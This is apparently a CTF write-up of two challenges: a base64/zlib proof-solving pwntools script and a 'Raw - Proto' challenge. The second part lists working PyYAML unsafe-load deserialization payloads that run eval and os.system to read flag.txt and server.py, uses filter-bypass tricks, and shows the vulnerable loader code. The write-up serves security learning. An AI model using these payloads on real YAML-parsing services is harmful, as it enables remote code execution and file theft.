## Challenge 1: Zebra-Lib (Easy)

We are given an instance to connect to and we are given the prompt

![zlib 1](./images/1.png)

Entering this into CyberChef showed that it was base64 encoded and compressed with zlib. There was a timeout and many many proofs to compute so I made a script.

### Solution

```
from pwn import *
import zlib
import base64

def decode( b64string ):
    decoded_data = base64.urlsafe_b64decode( b64string )
    return zlib.decompress( decoded_data)

host = "34.141.93.151"
port= 31610

p = remote(host, port)

while True:
    print(p.recvline())
    line = p.recvline()
    print(line)

    try:
        line = line.strip().decode('utf-8')
        print(p.recvline())
        answer = decode(line)
        print(answer.decode('utf-8'))
        p.send(answer + b'\n')
    except:
        print(p.recvline())
        print(p.recvline())
        print(p.recvline())

```

### Flag

After 500 proofs computed, we get the flag
![zlib](images/zlib.png)

## Raw - Proto (Medium)

We are given another instance to connect to and upon entering some text, we are given a hint that it indicates that `yaml.load()` is loading in unsanitized input.

### Solution

This was my first time trying anything yaml related, so I just hunted around the internet for yaml injections from PayloadsAllTheThings and Hacktricks etc.

I built out a few payloads and tried to see what was available, there was a blacklist for the word open

#PAYLOADS THAT WORK

!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "print(globals()['__builtins__']['op'+'en']('flag.txt','r').read())"]]]


!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "print(self.__class__.__mro__[10].__subclasses__()[133].__init__.__globals__['system']('cat flag.txt'))" ]]]

!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "print(self.__class__.__mro__[10].__subclasses__()[133].__init__.__globals__['system']('cat server.py'))" ]]]
```

After tinkering around a bit, I realised that there were some protections. The `os` module was removed, the `open` text filtered, `hex` was filtered, `base64` was filtered.

My payload was simply to concatenate `"op" + "en"` and get around the filter but there were some other brilliant ways to get around it.

List of Working Payloads:

```
!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "print(globals()['__builtins__']['op'+'en']('flag.txt','r').read())"]]]


!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "print(self.__class__.__mro__[10].__subclasses__()[133].__init__.__globals__['system']('cat flag.txt'))" ]]]

!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , ["print(exec('''sys.modules['os.path'].os.system('cat flag.txt')'''))"]]]
```

Examining the filters around showed that they had this `__init__.py` file:

```
def system(lol=None):
  print("Try Harder!")import sys,yaml
import os
del os
sys.modules['os']=None
x = ''.join(sys.stdin.readline())
if 'open' in x:
    print("Try Harder! I bet you can.. lol.")
    sys.exit(0)
if '\\x' in x:
    print("Try Harder! Hex in python? Is that all you can think off?")
    sys.exit(0)
if 'base64' in x:
    print("Try Harder! base64 in python? Is that all you can think off?")
    sys.exit(0)
print(yaml.load(x))
```
